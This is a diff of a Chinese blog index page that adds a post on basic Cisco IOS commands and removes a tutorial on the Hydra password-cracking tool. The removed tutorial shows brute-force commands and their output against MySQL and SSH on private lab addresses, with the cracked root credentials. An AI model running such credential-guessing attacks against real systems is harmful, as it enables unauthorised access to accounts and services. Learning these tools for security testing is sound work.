@@ -199,6 +199,223 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://aiyingke.cn/2022/11/30/Cisco%20IOS%20%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E9%9B%86%E6%B1%87%E6%80%BB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/RupertTears.jpg">
+      <meta itemprop="name" content="Rupert-Tears">
+      <meta itemprop="description" content="每个优秀的人，都有一段沉默的时光。那段时光，是付出了很多努力，却得不到结果的日子，我们把它叫做扎根。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="爱影客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/11/30/Cisco%20IOS%20%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E9%9B%86%E6%B1%87%E6%80%BB/" class="post-title-link" itemprop="url">Cisco IOS 基础命令集汇总</a>
+        </h2>
+
+        <div class="post-meta">
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-11-30 11:37:37" itemprop="dateCreated datePublished" datetime="2022-11-30T11:37:37+08:00">2022-11-30</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-12-01 09:46:11" itemprop="dateModified" datetime="2022-12-01T09:46:11+08:00">2022-12-01</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%80%9D%E7%A7%91CCNA%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/" itemprop="url" rel="index"><span itemprop="name">思科CCNA网络基础入门</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="一：Cisco-IOS"><a href="#一：Cisco-IOS" class="headerlink" title="一：Cisco IOS"></a>一：Cisco IOS</h1><h2 id="1-1-简介"><a href="#1-1-简介" class="headerlink" title="1.1 简介"></a>1.1 简介</h2><ul>
+<li>Cisco internetwork operating system（IOS）：为 Cisco 设备配备的系统软件。应用于路由器、局域网交换机、小型无线接入点、具有几十个接口的大型路由器等。</li>
+</ul>
+<h2 id="1-2-功能"><a href="#1-2-功能" class="headerlink" title="1.2 功能"></a>1.2 功能</h2><ul>
+<li>Cisco IOS 可为设备提供以下网络服务<ul>
+<li>基本的路由和交换功能</li>
+<li>安全可靠地访问网络资源</li>
+<li>网络可伸缩性</li>
+</ul>
+</li>
+</ul>
+<h2 id="1-3-访问方式"><a href="#1-3-访问方式" class="headerlink" title="1.3 访问方式"></a>1.3 访问方式</h2><ul>
+<li>可以通过多种方法访问 CLI 环境，常见方式：<ul>
+<li>控制台</li>
+<li>Telnet 或者 SSH</li>
+<li>辅助端口</li>
+</ul>
+</li>
+</ul>
+<img src="/2022/11/30/Cisco%20IOS%20%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E9%9B%86%E6%B1%87%E6%80%BB/image-20221130114858440.png" style="zoom: 50%;">
+
+<h2 id="1-4-访问模式"><a href="#1-4-访问模式" class="headerlink" title="1.4 访问模式"></a>1.4 访问模式</h2><ul>
+<li>用户执行模式 “&gt;”</li>
+<li>特权执行模式 “#”</li>
+<li>全局配置模式<ul>
+<li>从全局配置模式可进入多种不同的配置模式。其中每种模式可用于配置 IOS 设备的特定部分或者特定功能。</li>
+</ul>
+</li>
+<li>其他特定模式<ul>
+<li>接口模式：用于配置一个网络接口（Fa0&#x2F;0、S0&#x2F;0&#x2F;0 等）</li>
+<li>线路模式：用于配置一条线路（实际线路或者虚拟线路），如控制台、AUX、VTY等</li>
+<li>路由配置模式：用于配置一个路由选择协议进程的相关参数</li>
+</ul>
+</li>
+</ul>
+<h2 id="1-5-模式切换"><a href="#1-5-模式切换" class="headerlink" title="1.5 模式切换"></a>1.5 模式切换</h2><ul>
+<li>enable：用户执行模式进入特权模式</li>
+<li>configure terminal：特权模式进入全局配置模式</li>
+<li>exit：返回上一级模式</li>
+<li>end：直接返回特权模式</li>
+</ul>
+<h2 id="1-6-基础操作"><a href="#1-6-基础操作" class="headerlink" title="1.6 基础操作"></a>1.6 基础操作</h2><ul>
+<li>?：使用 ? 可以匹配查看命令库</li>
+<li>设置IP：ip address IP地址 子网掩码</li>
+<li>no：使用 no shutdown，退出保持状态开启。</li>
+<li>show running-config：查看配置信息</li>
+<li>show ip interface brief：查看 ip 简短信息</li>
+<li>hostname 名称：设置主机名称（全局模式下）</li>
+<li>enable password 密码：设置主机密码</li>
+<li>no enable password：关闭密码验证</li>
+<li>enable secret 密码：采用加密方式设置密码</li>
+</ul>
+<h2 id="1-7-语法检查"><a href="#1-7-语法检查" class="headerlink" title="1.7 语法检查"></a>1.7 语法检查</h2><ul>
+<li>incomplete command：命令不完整</li>
+<li>invalid input detected at ‘^’ marker：箭头所指字符无法识别 </li>
+<li>ambiguous comm：未知输入</li>
+</ul>
+<h2 id="1-8-基本命令结构"><a href="#1-8-基本命令结构" class="headerlink" title="1.8 基本命令结构"></a>1.8 基本命令结构</h2><ul>
+<li>每个 IOS 命令都具有特定的格式或者语法，并在相应的提示符下执行</li>
+<li>常规命令语法为命令后接相应的关键字和参数<ul>
+<li>Router&gt; ping 192.168.1.2</li>
+</ul>
+</li>
+<li>某些命令包括一个关键字和参数子集，此子集可提供额外功能</li>
+</ul>
+<h2 id="1-9-快捷键"><a href="#1-9-快捷键" class="headerlink" title="1.9 快捷键"></a>1.9 快捷键</h2><ul>
+<li>Tab：填写命令或者关键字的剩下部分</li>
+<li>Ctrl+R：重新显示一行</li>
+<li>Ctrl+Z：退出配置模式并返回执行模式</li>
+<li>Ctrl+C：放弃当前命令并退出配置模式</li>
+<li>Ctrl+Shift+6：用于中断诸如 ping 或 traceroute 之类的 IOS 进程</li>
+<li>向上箭头：上一条键入命令</li>
+<li>向下箭头：下一条键入命令</li>
+</ul>
+<h2 id="1-10-常用配置"><a href="#1-10-常用配置" class="headerlink" title="1.10 常用配置"></a>1.10 常用配置</h2><ul>
+<li>配置用户登录密码<ul>
+<li>控制台口令：用于限制人员通过控制台连接访问设备</li>
+<li>使能口令：用于限制人员访问特权执行模式</li>
+<li>使能加密口令：经加密，，用于限制人员访问特权执行模式</li>
+<li>VTY口令：用于限制人员通过 Telnet 访问设备</li>
+</ul>
+</li>
+<li>管理配置文件<ul>
+<li>将当前配置写入启动配置文件<ul>
+<li>write</li>
+<li>copy running-config startup-config</li>
+</ul>
+</li>
+<li>删除启动配置 文件<ul>
+<li>erase startup-config</li>
+<li>delete flash:config.text</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>接口配置<ul>
+<li>进入接口<ul>
+<li>interface 接口类型 插槽&#x2F;接口编号</li>
+</ul>
+</li>
+<li>为接口配置IP地址<ul>
+<li>ip address ip地址 子网掩码</li>
+</ul>
+</li>
+<li>激活接口<ul>
+<li>no shutdown（默认是shutdown状态）</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>show 命令<ul>
+<li>show version：查看当前操作系统版本</li>
+<li>show running-config：查看运行配置</li>
+<li>show startup-config：查看启动配置</li>
+<li>show flash：查看FLASH</li>
+<li>show cpu：查看cpu利用率</li>
+<li>show memory：查看内存使用情况</li>
+<li>show interface：查看端口</li>
+</ul>
+</li>
+<li>验证配置<ul>
+<li>ping</li>
+<li>traceroute</li>
+</ul>
+</li>
+</ul>
+<h1 id="二：以太网技术线缆标准"><a href="#二：以太网技术线缆标准" class="headerlink" title="二：以太网技术线缆标准"></a>二：以太网技术线缆标准</h1><ul>
+<li>T-568A：绿白-绿-橙白-蓝-蓝白-橙-棕白-棕</li>
+<li>T-568B：橙白-橙-绿白-蓝-蓝白-绿-棕白-棕</li>
+<li>标准网线：不同设备用于直通线，即两头都是568A或者都是568B</li>
+<li>交叉网线：同等设备用交叉线即一头为568A，一头为568B</li>
+<li>全反线（一般用于配置线缆）两端线序刚好相反</li>
+</ul>
+<h1 id="三：工程三招"><a href="#三：工程三招" class="headerlink" title="三：工程三招"></a>三：工程三招</h1><ul>
+<li>no ip domain lookup：关闭域名解析（防止敲错命令查询）</li>
+<li>line console 0<ul>
+<li>logging synchronous：log当前显示信息同步</li>
+<li>no exec-timeout：关闭会话超时，防止一段时间不操作自动退出</li>
+</ul>
+</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://aiyingke.cn/2022/11/30/IP%E5%9C%B0%E5%9D%80%E5%8F%8A%E5%AD%90%E7%BD%91%E6%8E%A9%E7%A0%81%E5%88%92%E5%88%86/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1429,88 +1646,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://aiyingke.cn/2022/11/26/Hydra-%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/RupertTears.jpg">
-      <meta itemprop="name" content="Rupert-Tears">
-      <meta itemprop="description" content="每个优秀的人，都有一段沉默的时光。那段时光，是付出了很多努力，却得不到结果的日子，我们把它叫做扎根。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="爱影客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/11/26/Hydra-%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/" class="post-title-link" itemprop="url">Hydra 使用教程</a>
-        </h2>
-
-        <div class="post-meta">
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-11-26 13:37:27 / 修改时间：16:04:44" itemprop="dateCreated datePublished" datetime="2022-11-26T13:37:27+08:00">2022-11-26</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="一：简介"><a href="#一：简介" class="headerlink" title="一：简介"></a>一：简介</h1><p>Hydra 是一款非常强大的暴力破解工具，可以利用它对众多协议进行口令、账号、密码的爆破，支持FTP、MySQL、SMTP、TELNET、SSH等众多的协议爆破。</p>
-<p>Hydra 是一个验证性质的工具，主要目的是：展示安全研究人员从远程获取一个系统认证权限。</p>
-<h1 id="二：基础指令"><a href="#二：基础指令" class="headerlink" title="二：基础指令"></a>二：基础指令</h1><h2 id="2-1-概述"><a href="#2-1-概述" class="headerlink" title="2.1 概述"></a>2.1 概述</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">hydra</span><br><span class="line"></span><br><span class="line">Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line">Hydra v9.3 2022的作者：van Hauser/THC &amp; David Maciejak。请不要在军事或者特情局组织中使用，或者用于非法目的（这是非约束性的，反正这些****无视法律和道德）</span><br><span class="line"></span><br><span class="line">Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]</span><br><span class="line">语法：hydra ...</span><br><span class="line">hydra [ [-l LOGIN|-L FILE] [-p PASS|-P FILE] ]</span><br><span class="line">hydra [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">选项：</span><br><span class="line">  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE</span><br><span class="line">  -l 登录名 或者 -L 文件  登录使用一个登录名，或者从文件中加载多个登录</span><br><span class="line">  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE</span><br><span class="line">  -p 密码 或者 -P 文件	尝试密码登录，或者从文件中加载多个密码</span><br><span class="line">  -C FILE   colon separated &quot;login:pass&quot; format, instead of -L/-P options</span><br><span class="line">  -C 文件		冒号分隔格式 &quot;login:pass&quot;，而不是 -L/-P 选项</span><br><span class="line">  -M FILE   list of servers to attack, one entry per line, &#x27;:&#x27; to specify port</span><br><span class="line">  -M 文件		要攻击的服务器列表，每行一个条目，使用&#x27;:&#x27;去指定端口</span><br><span class="line">  -t TASKS  run TASKS number of connects in parallel per target (default: 16)</span><br><span class="line">  -t 线程数	运行任务在每一个目标的并行连接数（默认值：16）</span><br><span class="line">  -U        service module usage details</span><br><span class="line">  -U		服务模块使用详情</span><br><span class="line">  -m OPT    options specific for a module, see -U output for information</span><br><span class="line">  -m 选项		特定于模块的选项，使用 -U 查看输出详细信息</span><br><span class="line">  -h        more command line options (COMPLETE HELP)</span><br><span class="line">  -h		更多命令行选项（完整帮助）</span><br><span class="line">  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)</span><br><span class="line">  服务器		目标DNS，IP 或者 网关 192.168.0.0/24（此选项或者 -M 选项）</span><br><span class="line">  service   the service to crack (see below for supported protocols)</span><br><span class="line">  服务		要破解的服务（有关支持的协议，请参见下文）</span><br><span class="line">  OPT       some service modules support additional input (-U for module help)</span><br><span class="line">  选项		一些支持附加输入的服务模块（-U 表示模块帮助）</span><br><span class="line"></span><br><span class="line">Supported services: adam6500 asterisk cisco cisco-enable cobaltstrike cvs firebird ftp[s] http[s]-&#123;head|get|post&#125; http[s]-&#123;get|post&#125;-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-&#123;cram|digest&#125;md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp</span><br><span class="line">支持的服务：...</span><br><span class="line"></span><br><span class="line">Hydra is a tool to guess/crack valid login/password pairs.</span><br><span class="line">Hydra 是一个 猜测/破解 有效 登录/密码对 的工具。</span><br><span class="line">Licensed under AGPL v3.0. The newest version is always available at;</span><br><span class="line">根据AGPL v3.0许可，最新版本可以从以下网址获取：</span><br><span class="line">https://github.com/vanhauser-thc/thc-hydra</span><br><span class="line">Please don&#x27;t use in military or secret service organizations, or for illegal</span><br><span class="line">purposes. (This is a wish and non-binding - most such people do not care about</span><br><span class="line">laws and ethics anyway - and tell themselves they are one of the good ones.)</span><br><span class="line">请不要使用在军事或者密码服务组织中使用，否则为非法目的。（这是一个愿望，没有约束力，大多数这样的人不关心法律和道德，告诉自己他们是好的。）</span><br><span class="line"></span><br><span class="line">Example:  hydra -l user -P passlist.txt ftp://192.168.0.1</span><br><span class="line">示例：hydar ...</span><br></pre></td></tr></table></figure>
-
-<h2 id="2-2-破解MySQL"><a href="#2-2-破解MySQL" class="headerlink" title="2.2 破解MySQL"></a>2.2 破解MySQL</h2><h3 id="（1）指定-IP-端口破解"><a href="#（1）指定-IP-端口破解" class="headerlink" title="（1）指定 IP 端口破解"></a>（1）指定 IP 端口破解</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hydra -L 登录账户薄 -P 密码薄 mysql://目标IP:mysql端口号</span></span><br><span class="line">hydra -L ./login.txt -P ./passwd.txt mysql://192.168.1.106:3306</span><br><span class="line"></span><br><span class="line">Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-26 14:23:55</span><br><span class="line">Hydra 开始于 2022-11-26 14:23:55</span><br><span class="line">[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)</span><br><span class="line">信息：将任务数量减少到4（mysql不喜欢多并行连接）</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 15 login tries (l:3/p:5), ~4 tries per task</span><br><span class="line">数据：每台服务器最多4个任务，总共4个任务，15次登录尝试（l:3/p:5）,每个任务约4次尝试</span><br><span class="line">[DATA] attacking mysql://192.168.1.106:3306/</span><br><span class="line">数据：攻击 mysql://192.168.1.106:3306/</span><br><span class="line">[3306][mysql] host: 192.168.1.106   login: root   password: root</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">1个目标中1个成功完成，找到一个有效密码。</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-26 14:23:56</span><br><span class="line">Hydra 完成于 2022-11-26 14:23:56</span><br></pre></td></tr></table></figure>
-
-<h3 id="（2）默认端口破解"><a href="#（2）默认端口破解" class="headerlink" title="（2）默认端口破解"></a>（2）默认端口破解</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果服务使用的是默认端口，那么指令也可以这样写</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hydra -L ./login.txt -P ./passwd.txt 目标IP mysql</span></span><br><span class="line">hydra -L ./login.txt -P ./passwd.txt 192.168.1.106 mysql       </span><br><span class="line">Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-26 14:55:38</span><br><span class="line">[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 15 login tries (l:3/p:5), ~4 tries per task</span><br><span class="line">[DATA] attacking mysql://192.168.1.106:3306/</span><br><span class="line">[3306][mysql] host: 192.168.1.106   login: root   password: root</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-26 14:55:38</span><br></pre></td></tr></table></figure>
-
-<h3 id="（3）展示爆破过程"><a href="#（3）展示爆破过程" class="headerlink" title="（3）展示爆破过程"></a>（3）展示爆破过程</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">展示爆破过程，添加指令 -V</span></span><br><span class="line">hydra -L ./login.txt -P ./passwd.txt -V  mysql://192.168.1.106:3306 </span><br><span class="line">Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-26 15:00:51</span><br><span class="line">[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 15 login tries (l:3/p:5), ~4 tries per task</span><br><span class="line">[DATA] attacking mysql://192.168.1.106:3306/</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;ghost&quot; - pass &quot;123456&quot; - 1 of 15 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;ghost&quot; - pass &quot;abcdefg&quot; - 2 of 15 [child 1] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;ghost&quot; - pass &quot;admin&quot; - 3 of 15 [child 2] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;ghost&quot; - pass &quot;root&quot; - 4 of 15 [child 3] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;ghost&quot; - pass &quot;987654&quot; - 5 of 15 [child 2] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;root&quot; - pass &quot;123456&quot; - 6 of 15 [child 1] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;root&quot; - pass &quot;abcdefg&quot; - 7 of 15 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;root&quot; - pass &quot;admin&quot; - 8 of 15 [child 2] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;root&quot; - pass &quot;root&quot; - 9 of 15 [child 3] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;root&quot; - pass &quot;987654&quot; - 10 of 15 [child 1] (0/0)</span><br><span class="line">[3306][mysql] host: 192.168.1.106   login: root   password: root</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;admin&quot; - pass &quot;123456&quot; - 11 of 15 [child 3] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;admin&quot; - pass &quot;abcdefg&quot; - 12 of 15 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;admin&quot; - pass &quot;admin&quot; - 13 of 15 [child 1] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;admin&quot; - pass &quot;root&quot; - 14 of 15 [child 2] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;admin&quot; - pass &quot;987654&quot; - 15 of 15 [child 3] (0/0)</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-26 15:00:51</span><br></pre></td></tr></table></figure>
-
-<h2 id="2-3-ssh-破解"><a href="#2-3-ssh-破解" class="headerlink" title="2.3 ssh 破解"></a>2.3 ssh 破解</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hydra -L 登录薄 -P 密码薄 -t 线程数 ssh://目标ip</span></span><br><span class="line">hydra -L ./login.txt -P ./passwd.txt -t 4 ssh://192.168.80.129</span><br><span class="line"></span><br><span class="line">Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-26 16:02:31</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 9 login tries (l:3/p:3), ~3 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.80.129:22/</span><br><span class="line">[22][ssh] host: 192.168.80.129   login: ghost   password: root</span><br><span class="line">[22][ssh] host: 192.168.80.129   login: root   password: root</span><br><span class="line">1 of 1 target successfully completed, 2 valid passwords found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-26 16:02:50</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1582,7 +1717,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">67</span>
+          <span class="site-state-item-count">68</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
